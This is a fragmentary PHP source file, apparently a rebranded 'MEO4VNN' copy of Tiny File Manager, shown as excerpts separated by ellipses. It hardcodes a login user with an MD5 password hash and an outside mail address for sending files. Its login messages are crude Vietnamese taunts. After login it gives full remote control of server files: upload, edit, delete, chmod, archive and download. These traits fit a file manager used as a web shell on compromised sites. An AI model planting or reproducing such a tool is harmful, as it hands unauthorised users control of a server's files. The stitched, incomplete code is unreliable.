...
$auth_users = array(
    'meo4vnn' => 'cae782d14d6f2fad831b7484f366ccfc', 
...
// Send files though mail
$toMailId = "meo4.info@meo4.info"; //yourmailid@mail.com
...
if (defined('m4_CONFIG') && is_file(m4_CONFIG) ) {
	include(m4_CONFIG);
}
...
// clean $root_url
$root_url = m4_clean_path($root_url);

// abs path for site
defined('m4_SHOW_HIDDEN') || define('m4_SHOW_HIDDEN', $show_hidden_files);
defined('m4_ROOT_PATH') || define('m4_ROOT_PATH', $root_path);
defined('m4_ROOT_URL') || define('m4_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
defined('m4_SELF_URL') || define('m4_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);

// logout
if (isset($_GET['logout'])) {
    unset($_SESSION['logged']);
    m4_redirect(m4_SELF_URL);
}

// Show image here
if (isset($_GET['img'])) {
    m4_show_image($_GET['img']);
}
...
if ($use_auth) {
    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
        // Logged
    } elseif (isset($_POST['m4_usr'], $_POST['m4_pwd'])) {
        // Logging In
        sleep(1);
        if (isset($auth_users[$_POST['m4_usr']]) && md5($_POST['m4_pwd']) === $auth_users[$_POST['m4_usr']]) {
            $_SESSION['logged'] = $_POST['m4_usr'];
            m4_set_msg('OK con dê! Vào đi...');
            m4_redirect(m4_SELF_URL . '?p=');
        } else {
            unset($_SESSION['logged']);
            m4_set_msg('Mật khẩu đéo đúng rồi nhé!', 'error');
            m4_redirect(m4_SELF_URL);
        }
    } else {
        // Form
        unset($_SESSION['logged']);
        m4_show_header_login();
        m4_show_message();
        ?>
        <div class="path login-form">
		<h1>Đăng nhập quản lý</h1>
            <form action="" method="post">
                <label for="m4_usr">Tài khoản:</label><input type="text" id="m4_usr" name="m4_usr" value="" placeholder="Username" required><br>
                <label for="m4_pwd">Mật khẩu:</label><input type="password" id="m4_pwd" name="m4_pwd" value="" placeholder="Password" required><br>
                <input type="submit" value="Đăng nhập">
            </form>
        </div>
        <?php
        m4_show_footer_login();
        exit;
    }
}

defined('m4_LANG') || define('m4_LANG', $lang);
defined('m4_EXTENSION') || define('m4_EXTENSION', $upload_extensions);
define('m4_READONLY', $use_auth && !empty($readonly_users) && isset($_SESSION['logged']) && in_array($_SESSION['logged'], $readonly_users));
define('m4_IS_WIN', DIRECTORY_SEPARATOR == '\\');
...
define('m4_PATH', $p);
define('m4_USE_AUTH', $use_auth);
define('m4_EDIT_FILE', $edit_files);
defined('m4_ICONV_INPUT_ENC') || define('m4_ICONV_INPUT_ENC', $iconv_input_encoding);
defined('m4_USE_HIGHLIGHTJS') || define('m4_USE_HIGHLIGHTJS', $use_highlightjs);
defined('m4_HIGHLIGHTJS_STYLE') || define('m4_HIGHLIGHTJS_STYLE', $highlightjs_style);
defined('m4_DATETIME_FORMAT') || define('m4_DATETIME_FORMAT', $datetime_format);
...
//AJAX Request
if (isset($_POST['ajax']) && !m4_READONLY) {
...
// Delete file / folder
if (isset($_GET['del']) && !m4_READONLY) {
    $del = $_GET['del'];
    $del = m4_clean_path($del);
    $del = str_replace('/', '', $del);
    if ($del != '' && $del != '..' && $del != '.') {
        $path = m4_ROOT_PATH;
        if (m4_PATH != '') {
        ...
        if (m4_rdelete($path . '/' . $del)) {
            $msg = $is_dir ? 'Folder <b>%s</b> deleted' : 'File <b>%s</b> deleted';
            m4_set_msg(sprintf($msg, $del));
        } else {
            $msg = $is_dir ? 'Folder <b>%s</b> not deleted' : 'File <b>%s</b> not deleted';
            m4_set_msg(sprintf($msg, $del), 'error');
        }
    } else {
        m4_set_msg('Wrong file or folder name', 'error');
    }
    m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
}

// Create folder
if (isset($_GET['new']) && isset($_GET['type']) && !m4_READONLY) {
    $new = $_GET['new'];
    $type = $_GET['type'];
    $new = m4_clean_path($new);
    $new = str_replace('/', '', $new);
    if ($new != '' && $new != '..' && $new != '.') {
        $path = m4_ROOT_PATH;
        if (m4_PATH != '') {
        ...
        if($_GET['type']=="file") {
            if(!file_exists($path . '/' . $new)) {
                ...
                m4_set_msg(sprintf('File <b>%s</b> created', $new));
            } else {
                m4_set_msg(sprintf('File <b>%s</b> already exists', $new), 'alert');
            }
        } else {
            if (m4_mkdir($path . '/' . $new, false) === true) {
                m4_set_msg(sprintf('Folder <b>%s</b> created', $new));
            } elseif (m4_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
                m4_set_msg(sprintf('Folder <b>%s</b> already exists', $new), 'alert');
            } else {
                m4_set_msg(sprintf('Folder <b>%s</b> not created', $new), 'error');
            }
        }
    } else {
        m4_set_msg('Wrong folder name', 'error');
    }
    m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
}

// Copy folder / file
if (isset($_GET['copy'], $_GET['finish']) && !m4_READONLY) {
    // from
    $copy = $_GET['copy'];
    $copy = m4_clean_path($copy);
    // empty path
    if ($copy == '') {
        m4_set_msg('Source path not defined', 'error');
        m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
    }
    // abs path from
    $from = m4_ROOT_PATH . '/' . $copy;
    // abs path to
    $dest = m4_ROOT_PATH;
    if (m4_PATH != '') {
        $dest .= '/' . m4_PATH;
    ...
    // copy/move
    if ($from != $dest) {
        $msg_from = trim(m4_PATH . '/' . basename($from), '/');
        if ($move) {
            $rename = m4_rename($from, $dest);
            if ($rename) {
                m4_set_msg(sprintf('Moved from <b>%s</b> to <b>%s</b>', $copy, $msg_from));
            } elseif ($rename === null) {
                m4_set_msg('File or folder with this path already exists', 'alert');
            } else {
                m4_set_msg(sprintf('Error while moving from <b>%s</b> to <b>%s</b>', $copy, $msg_from), 'error');
            }
        } else {
            if (m4_rcopy($from, $dest)) {
                m4_set_msg(sprintf('Copyied from <b>%s</b> to <b>%s</b>', $copy, $msg_from));
            } else {
                m4_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', $copy, $msg_from), 'error');
            }
        }
    } else {
        m4_set_msg('Paths must be not equal', 'alert');
    }
    m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
}

// Mass copy files/ folders
if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish']) && !m4_READONLY) {
    // from
    $path = m4_ROOT_PATH;
    if (m4_PATH != '') {
        $path .= '/' . m4_PATH;
    ...
    // to
    $copy_to_path = m4_ROOT_PATH;
    $copy_to = m4_clean_path($_POST['copy_to']);
    if ($copy_to != '') {
    ...
    if (!is_dir($copy_to_path)) {
        if (!m4_mkdir($copy_to_path, true)) {
            m4_set_msg('Unable to create destination folder', 'error');
            m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
        }
    }
    // move?
    ...
    if (is_array($files) && count($files)) {
        ...
        if ($errors == 0) {
            ...
            m4_set_msg($msg, 'error');
        }
    } else {
        m4_set_msg('Nothing selected', 'alert');
    }
    m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
}

// Rename
if (isset($_GET['ren'], $_GET['to']) && !m4_READONLY) {
    // old name
    $old = $_GET['ren'];
    $old = m4_clean_path($old);
    $old = str_replace('/', '', $old);
    // new name
    $new = $_GET['to'];
    $new = m4_clean_path($new);
    ...
    // rename
    if ($old != '' && $new != '') {
        if (m4_rename($path . '/' . $old, $path . '/' . $new)) {
            m4_set_msg(sprintf('Renamed from <b>%s</b> to <b>%s</b>', $old, $new));
        } else {
            m4_set_msg(sprintf('Error while renaming from <b>%s</b> to <b>%s</b>', $old, $new), 'error');
        }
    } else {
        m4_set_msg('Names not set', 'error');
    }
    m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
}
...
if (isset($_GET['dl'])) {
    ...
    if ($dl != '' && is_file($path . '/' . $dl)) {
        ...
        m4_set_msg('File not found', 'error');
        m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
    }
}

// Upload
if (isset($_POST['upl']) && !m4_READONLY) {
    $path = m4_ROOT_PATH;
    if (m4_PATH != '') {
        $path .= '/' . m4_PATH;
    }
	...
	$allowed = (m4_EXTENSION) ? explode(',', m4_EXTENSION) : false;
    ...
    if ($errors == 0 && $uploads > 0) {
        m4_set_msg(sprintf('All files uploaded to <b>%s</b>', $path));
    } elseif ($errors == 0 && $uploads == 0) {
        m4_set_msg('Nothing uploaded', 'alert');
    } else {
        m4_set_msg(sprintf('Error while uploading files. Uploaded files: %s', $uploads), 'error');
    }
    m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
}

// Mass deleting
if (isset($_POST['group'], $_POST['delete']) && !m4_READONLY) {
    $path = m4_ROOT_PATH;
    if (m4_PATH != '') {
        $path .= '/' . m4_PATH;
    }
    ...
    if (is_array($files) && count($files)) {
        foreach ($files as $f) {
            if ($f != '') {
                $new_path = $path . '/' . $f;
                if (!m4_rdelete($new_path)) {
                    $errors++;
                }
            }
        }
        if ($errors == 0) {
            m4_set_msg('Selected files and folder deleted');
        } else {
            m4_set_msg('Error while deleting items', 'error');
        }
    } else {
        m4_set_msg('Nothing selected', 'alert');
    }
...
// Pack files
if (isset($_POST['group'], $_POST['zip']) && !m4_READONLY) {
    $path = m4_ROOT_PATH;
    if (m4_PATH != '') {
        $path .= '/' . m4_PATH;
    }
    ...
    if (!class_exists('ZipArchive')) {
        m4_set_msg('Operations with archives are not available', 'error');
        m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
    }
    ...
    if (!empty($files)) {
        ...
        $zipper = new m4_Zipper();
        $res = $zipper->create($zipname, $files);

        if ($res) {
            m4_set_msg(sprintf('Archive <b>%s</b> created', $zipname));
        } else {
            m4_set_msg('Archive not created', 'error');
        }
    } else {
        m4_set_msg('Nothing selected', 'alert');
    }
...
// Unpack
if (isset($_GET['unzip']) && !m4_READONLY) {
    $unzip = $_GET['unzip'];
    $unzip = m4_clean_path($unzip);
    ...
    if ($unzip != '' && is_file($path . '/' . $unzip)) {
        ...
        if (isset($_GET['tofolder'])) {
            ...
            if (m4_mkdir($path . '/' . $tofolder, true)) {
                $path .= '/' . $tofolder;
            }
        }
        ...
        if ($res) {
            m4_set_msg('Archive unpacked');
        } else {
            m4_set_msg('Archive not unpacked', 'error');
        }
...
if (isset($_POST['chmod']) && !m4_READONLY && !m4_IS_WIN) {
    $path = m4_ROOT_PATH;
    if (m4_PATH != '') {
        $path .= '/' . m4_PATH;
    }
    ...
    if (@chmod($path . '/' . $file, $mode)) {
        m4_set_msg('Permissions changed');
    } else {
        m4_set_msg('Permissions not changed', 'error');
    }
...
// get parent folder
$parent = m4_get_parent_path(m4_PATH);
...
if (is_array($objects)) {
    foreach ($objects as $file) {
        ...
        if (!m4_SHOW_HIDDEN && substr($file, 0, 1) === '.') {
            continue;
        }
        $new_path = $path . '/' . $file;
        if (is_file($new_path)) {
...
// upload form
if (isset($_GET['upload']) && !m4_READONLY) {
    m4_show_header(); // HEADER
    m4_show_nav_path(m4_PATH); // current path
    ?>
    <div class="path">
        <p><b>Uploading files</b></p>
        <p class="break-word">Destination folder: <?php echo m4_convert_win(m4_ROOT_PATH . '/' . m4_PATH) ?></p>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="hidden" name="p" value="<?php echo m4_enc(m4_PATH) ?>">
            ...
            <p>
                ...
                <b><a href="?p=<?php echo urlencode(m4_PATH) ?>"><i class="fa fa-times-circle"></i> Cancel</a></b>
            </p>
        </form>
    </div>
    <?php
...
// copy form POST
if (isset($_POST['copy']) && !m4_READONLY) {
    ...
    <div class="path">
        ...
        <form action="" method="post">
            ...
            foreach ($copy_files as $cf) {
                echo '<input type="hidden" name="file[]" value="' . m4_enc($cf) . '">' . PHP_EOL;
            }
            ?>
            <p class="break-word">Files: <b><?php echo implode('</b>, <b>', $copy_files) ?></b></p>
            <p class="break-word">Source folder: <?php echo m4_convert_win(m4_ROOT_PATH . '/' . m4_PATH) ?><br>
                <label for="inp_copy_to">Destination folder:</label>
                <?php echo m4_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo m4_enc(m4_PATH) ?>">
            </p>
...
// copy form
if (isset($_GET['copy']) && !isset($_GET['finish']) && !m4_READONLY) {
    $copy = $_GET['copy'];
    $copy = m4_clean_path($copy);
    if ($copy == '' || !file_exists(m4_ROOT_PATH . '/' . $copy)) {
        m4_set_msg('File not found', 'error');
        m4_redirect(m4_SELF_URL . '?p=' . urlencode(m4_PATH));
    }
    ...
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            Source path: <?php echo m4_convert_win(m4_ROOT_PATH . '/' . $copy) ?><br>
            Destination folder: <?php echo m4_convert_win(m4_ROOT_PATH . '/' . m4_PATH) ?>
        </p>
        <p>
            <b><a href="?p=<?php echo urlencode(m4_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(m4_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(m4_PATH) ?>"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        ...
        <ul class="folders break-word">
            ...
            foreach ($folders as $f) {
                ?>
                <li><a href="?p=<?php echo urlencode(trim(m4_PATH . '/' . $f, '/')) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-folder-o"></i> <?php echo m4_convert_win($f) ?></a></li>
            <?php
            }
            ?>
        </ul>
...
if (isset($_GET['view'])) {
    ...
    $file_url = m4_ROOT_URL . m4_convert_win((m4_PATH != '' ? '/' . m4_PATH : '') . '/' . $file);
    $file_path = $path . '/' . $file;

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = m4_get_mime_type($file_path);
    ...
    if ($ext == 'zip') {
        $is_zip = true;
        $view_title = 'Archive';
        $filenames = m4_get_zif_info($file_path);
    } elseif (in_array($ext, m4_get_image_exts())) {
        $is_image = true;
        $view_title = 'Image';
    } elseif (in_array($ext, m4_get_audio_exts())) {
        $is_audio = true;
        $view_title = 'Audio';
    } elseif (in_array($ext, m4_get_video_exts())) {
        $is_video = true;
        $view_title = 'Video';
    } elseif (in_array($ext, m4_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, m4_get_text_mimes())) {
        $is_text = true;
    ...
    ?>
    <div class="path">
        <p class="break-word"><b><?php echo $view_title ?> "<?php echo m4_convert_win($file) ?>"</b></p>
        <p class="break-word">
            Full path: <?php echo m4_convert_win($file_path) ?><br>
            File size: <?php echo m4_get_filesize($filesize) ?><?php if ($filesize >= 1000): ?> (<?php echo sprintf('%s bytes', $filesize) ?>)<?php endif; ?><br>
           MIME-type: <?php echo $mime_type ?><br>
            ...
            if ($is_zip && $filenames !== false) {
                ...
                Total size: <?php echo m4_get_filesize($total_uncomp) ?><br>
                Size in archive: <?php echo m4_get_filesize($total_comp) ?><br>
            ...
            // Text info
            if ($is_text) {
                $is_utf8 = m4_is_utf8($content);
                if (function_exists('iconv')) {
                    if (!$is_utf8) {
                        $content = iconv(m4_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
                    }
                }
        ...
        <p>
            <b><a href="?p=<?php echo urlencode(m4_PATH) ?>&amp;dl=<?php echo urlencode($file) ?>"><i class="fa fa-cloud-download"></i> Download</a></b> &nbsp;
            <b><a href="<?php echo $file_url ?>" target="_blank"><i class="fa fa-external-link-square"></i> Open</a></b> &nbsp;
            <?php
            // ZIP actions
            if (!m4_READONLY && $is_zip && $filenames !== false) {
                $zip_name = pathinfo($file_path, PATHINFO_FILENAME);
                ?>
                <b><a href="?p=<?php echo urlencode(m4_PATH) ?>&amp;unzip=<?php echo urlencode($file) ?>"><i class="fa fa-check-circle"></i> UnZip</a></b> &nbsp;
                <b><a href="?p=<?php echo urlencode(m4_PATH) ?>&amp;unzip=<?php echo urlencode($file) ?>&amp;tofolder=1" title="UnZip to <?php echo m4_enc($zip_name) ?>"><i class="fa fa-check-circle"></i>
                    UnZip to folder</a></b> &nbsp;
                <?php
            }
            if($is_text && !m4_READONLY) {
            ?>
            <b><a href="?p=<?php echo urlencode(trim(m4_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>" class="edit-file"><i class="fa fa-pencil-square"></i> Edit</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(trim(m4_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&env=ace" class="edit-file"><i class="fa fa-pencil-square"></i> Advanced Edit</a></b> &nbsp;
            <?php }
            if($send_mail && !m4_READONLY) {
            ?>
            <b><a href="javascript:mailto('<?php echo urlencode(trim(m4_ROOT_PATH.'/'.m4_PATH)) ?>','<?php echo urlencode($file) ?>')"><i class="fa fa-pencil-square"></i> Mail</a></b> &nbsp;
            <?php } ?>
            <b><a href="?p=<?php echo urlencode(m4_PATH) ?>"><i class="fa fa-chevron-circle-left"></i> Back</a></b>
        </p>
        <?php
        if ($is_zip) {
            // ZIP content
            if ($filenames !== false) {
                ...
                foreach ($filenames as $fn) {
                    if ($fn['folder']) {
                        ...
                        echo $fn['name'] . ' (' . m4_get_filesize($fn['filesize']) . ')<br>';
                    }
                }
                echo '</code>';
            } else {
            ...
            if (m4_USE_HIGHLIGHTJS) {
                ...
                if (empty($ext) || in_array(strtolower($file), m4_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $file)) {
                    $hljs_class = 'nohighlight';
                }
                $content = '<pre class="with-hljs"><code class="' . $hljs_class . '">' . m4_enc($content) . '</code></pre>';
            } elseif (in_array($ext, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
                // php highlight
                $content = highlight_string($content, true);
            } else {
                $content = '<pre>' . m4_enc($content) . '</pre>';
            }
            echo $content;
        }
        ?>
...
if (isset($_GET['edit'])) {
    ...
    if(isset($_POST['savedata'])) {
        ...
        @fwrite($fd, $writedata);
        fclose($fd);
        m4_set_msg('File Saved Successfully', 'alert');
    }
    ...
    if (in_array($ext, m4_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, m4_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    }
    ...
    <div class="path">
        <div class="edit-file-actions">
            <a title="Cancel" href="?p=<?php echo urlencode(trim(m4_PATH)) ?>&amp;view=<?php echo urlencode($file) ?>"><i class="fa fa-reply-all"></i> Cancel</a>
            ...
            <?php if($is_text) { ?>
                <?php if($isNormalEditor) { ?>
                    <a title="Advanced" href="?p=<?php echo urlencode(trim(m4_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&amp;env=ace"><i class="fa fa-paper-plane"></i> Advanced Editor</a>
                    <button type="button" name="Save" data-url="<?php echo $file_url ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save</button>
                <?php } else { ?>
                    <a title="Plain Editor" href="?p=<?php echo urlencode(trim(m4_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>"><i class="fa fa-text-height"></i> Plain Editor</a>
        ...
        if ($is_text && $isNormalEditor) {
            ...
            m4_set_msg('FILE EXTENSION HAS NOT SUPPORTED', 'error');
        }
        ?>
    </div>
    <?php
...
if (isset($_GET['chmod']) && !m4_READONLY && !m4_IS_WIN) {
    $file = $_GET['chmod'];
    $file = m4_clean_path($file);
    $file = str_replace('/', '', $file);
    if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) {
    ...
    $file_url = m4_ROOT_URL . (m4_PATH != '' ? '/' . m4_PATH : '') . '/' . $file;
    $file_path = $path . '/' . $file;
    ...
    <div class="path">
        ...
        <form action="" method="post">
            <input type="hidden" name="p" value="<?php echo m4_enc(m4_PATH) ?>">
            <input type="hidden" name="chmod" value="<?php echo m4_enc($file) ?>">
...
<?php if (!m4_READONLY): ?><th style="width:3%"><label><input type="checkbox" title="Invert selection" onclick="checkbox_toggle()"></label></th><?php endif; ?>
<th>Name</th><th style="width:10%">Size</th>
<th style="width:12%">Modified</th>
<?php if (!m4_IS_WIN): ?><th style="width:6%">Perms</th><th style="width:10%">Owner</th><?php endif; ?>
<th style="width:<?php if (!m4_READONLY): ?>13<?php else: ?>6.5<?php endif; ?>%">Actions</th></tr></thead>
<?php
// link to parent folder
if ($parent !== false) {
    ?>
<tr><?php if (!m4_READONLY): ?><td></td><?php endif; ?><td colspan="<?php echo !m4_IS_WIN ? '6' : '4' ?>"><a href="?p=<?php echo urlencode($parent) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></td></tr>
<?php
}
foreach ($folders as $f) {
    $is_link = is_link($path . '/' . $f);
    $img = $is_link ? 'icon-link_folder' : 'fa fa-folder-o';
    $modif = date(m4_DATETIME_FORMAT, filemtime($path . '/' . $f));
    ...
    ?>
<tr>
<?php if (!m4_READONLY): ?><td><label><input type="checkbox" name="file[]" value="<?php echo m4_enc($f) ?>"></label></td><?php endif; ?>
<td><div class="filename"><a href="?p=<?php echo urlencode(trim(m4_PATH . '/' . $f, '/')) ?>"><i class="<?php echo $img ?>"></i> <?php echo m4_convert_win($f) ?></a><?php echo ($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?></div></td>
<td>Folder</td><td><?php echo $modif ?></td>
<?php if (!m4_IS_WIN): ?>
<td><?php if (!m4_READONLY): ?><a title="Change Permissions" href="?p=<?php echo urlencode(m4_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?></td>
<td><?php echo $owner['name'] . ':' . $group['name'] ?></td>
<?php endif; ?>
<td class="inline-actions"><?php if (!m4_READONLY): ?>
<a title="Delete" href="?p=<?php echo urlencode(m4_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="return confirm('Delete folder?');"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
<a title="Rename" href="#" onclick="rename('<?php echo m4_enc(m4_PATH) ?>', '<?php echo m4_enc($f) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
<a title="Copy to..." href="?p=&amp;copy=<?php echo urlencode(trim(m4_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
<?php endif; ?>
<a title="Direct link" href="<?php echo m4_ROOT_URL . (m4_PATH != '' ? '/' . m4_PATH : '') . '/' . $f . '/' ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
</td></tr>
    <?php
    flush();
}
...
foreach ($files as $f) {
    $is_link = is_link($path . '/' . $f);
    $img = $is_link ? 'fa fa-file-text-o' : m4_get_file_icon_class($path . '/' . $f);
    $modif = date("d.m.y H:i", filemtime($path . '/' . $f));
    $filesize_raw = filesize($path . '/' . $f);
    $filesize = m4_get_filesize($filesize_raw);
    $filelink = '?p=' . urlencode(m4_PATH) . '&amp;view=' . urlencode($f);
...
<tr>
<?php if (!m4_READONLY): ?><td><label><input type="checkbox" name="file[]" value="<?php echo m4_enc($f) ?>"></label></td><?php endif; ?>
<td><div class="filename"><a href="<?php echo $filelink ?>" title="File info"><i class="<?php echo $img ?>"></i> <?php echo m4_convert_win($f) ?></a><?php echo ($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?></div></td>
<td><span title="<?php printf('%s bytes', $filesize_raw) ?>"><?php echo $filesize ?></span></td>
<td><?php echo $modif ?></td>
<?php if (!m4_IS_WIN): ?>
<td><?php if (!m4_READONLY): ?><a title="<?php echo 'Change Permissions' ?>" href="?p=<?php echo urlencode(m4_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?></td>
<td><?php echo $owner['name'] . ':' . $group['name'] ?></td>
<?php endif; ?>
<td class="inline-actions">
<?php if (!m4_READONLY): ?>
<a title="Delete" href="?p=<?php echo urlencode(m4_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="return confirm('Delete file?');"><i class="fa fa-trash-o"></i></a>
<a title="Rename" href="#" onclick="rename('<?php echo m4_enc(m4_PATH) ?>', '<?php echo m4_enc($f) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
<a title="Copy to..." href="?p=<?php echo urlencode(m4_PATH) ?>&amp;copy=<?php echo urlencode(trim(m4_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o"></i></a>
<?php endif; ?>
<a title="Direct link" href="<?php echo m4_ROOT_URL . (m4_PATH != '' ? '/' . m4_PATH : '') . '/' . $f ?>" target="_blank"><i class="fa fa-link"></i></a>
<a title="Download" href="?p=<?php echo urlencode(m4_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>"><i class="fa fa-download"></i></a>
</td></tr>
    <?php
    flush();
}
...
if (empty($folders) && empty($files)) {
    ?>
<tr><?php if (!m4_READONLY): ?><td></td><?php endif; ?><td colspan="<?php echo !m4_IS_WIN ? '6' : '4' ?>"><em><?php echo 'Folder is empty' ?></em></td></tr>
<?php
} else {
    ?>
<tr><?php if (!m4_READONLY): ?><td class="gray"></td><?php endif; ?><td class="gray" colspan="<?php echo !m4_IS_WIN ? '6' : '4' ?>">
Full size: <span title="<?php printf('%s bytes', $all_files_size) ?>"><?php echo m4_get_filesize($all_files_size) ?></span>,
...
<a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="float-right" style="color:silver">MEO4VNN | Tiny File Manager</a></p>
<?php endif; ?>
</form>
 ...
 */
function m4_rchmod($path, $filemode, $dirmode)
{
    if (is_dir($path)) {
        ...
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (!m4_rchmod($path . '/' . $file, $filemode, $dirmode)) {
                        return false;
                    }
                }
            }
 ...
 * @return bool
 */
function m4_rcopy($path, $dest, $upd = true, $force = true)
{
    if (is_dir($path)) {
        if (!m4_mkdir($dest, $force)) {
            return false;
        }
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (!m4_rcopy($path . '/' . $file, $dest . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
 ...
 * @return mixed|string
 */
function m4_get_mime_type($file_path)
{
 ...
 * @param int $code
 */
function m4_redirect($url, $code = 302)
{
 ...
 * @return bool|string
 */
function m4_get_parent_path($path)
{
    $path = m4_clean_path($path);
    if ($path != '') {
        $array = explode('/', $path);
        if (count($array) > 1) {
		...
		foreach( $file as $this_file ) {
			if( $this_file != "." && $this_file != ".." ) {
				if( is_dir("$directory/$this_file") ) {
					...
					// File
                    $ext = m4_get_file_icon_class($this_file);
 ...
 * @param string $status
 */
function m4_set_msg($msg, $status = 'ok')
{
 ...
 * @return string
 */
function m4_convert_win($filename)
{
    if (m4_IS_WIN && function_exists('iconv')) {
        $filename = iconv(m4_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
    }
    return $filename;
}
 ...
 * @return string
 */
function m4_get_file_icon_class($path)
{
    // get extension
 ...
 * @param string $path
 */
function m4_show_nav_path($path)
{
    global $lang;
    ?>
<div class="path main-nav">
        ...
        <?php
        $path = m4_clean_path($path);
        $root_url = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . m4_ROOT_PATH . "'></i></a>";
        ...
        if ($path != '') {
            ...
            for ($i = 0; $i < $count; $i++) {
                ...
                $array[] = "<a href='?p={$parent_enc}'>" . m4_convert_win($exploded[$i]) . "</a>";
            }
        ...
        <?php if (!m4_READONLY): ?>
        <a title="Tìm kiếm" href="javascript:showSearch('<?php echo urlencode(m4_PATH) ?>')"><i class="fa fa-search"></i></a>
        <a title="Upload files" href="?p=<?php echo urlencode(m4_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i></a>
        <a title="New folder" href="#createNewItem" ><i class="fa fa-plus-square"></i></a>
        <?php endif; ?>
        <?php if (m4_USE_AUTH): ?><a title="Đăng xuất" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i></a><?php endif; ?>
        </div>
</div>
<?php
}
...
<head>
<meta charset="utf-8">
<title>MEO4VNN | File Manager</title>
<meta name="Description" CONTENT="Author: CCP Programmers, MEO4VNN Tiny PHP File Manager">
<link rel="icon" href="<?php echo m4_SELF_URL ?>?img=favicon" type="image/png">
<link rel="shortcut icon" href="<?php echo m4_SELF_URL ?>?img=favicon" type="image/png">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
<?php if (isset($_GET['view']) && m4_USE_HIGHLIGHTJS): ?>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.2.0/styles/<?php echo m4_HIGHLIGHTJS_STYLE ?>.min.css">
<?php endif; ?>
<style>
...
<div id="wrapper">
  <div id="createNewItem" class="modalDialog"><div class="model-wrapper"><a href="#close" title="Close" class="close">X</a><h2>Create New Item</h2><p>
        ...
        <input type="submit" name="submit" class="group-btn" value="Create Now" onclick="newfolder('<?php echo m4_enc(m4_PATH) ?>');return false;"></p></div></div>
...
<?php endif; ?>
<?php if (isset($_GET['edit']) && isset($_GET['env']) && m4_EDIT_FILE): ?>
 ...
 * @param string $img
 */
function m4_show_image($img)
{
    $modified_time = gmdate('D, d M Y 00:00:00') . ' GMT';
    $expires_time = gmdate('D, d M Y 00:00:00', strtotime('+1 day')) . ' GMT';

    $img = trim($img);
    $images = m4_get_images();
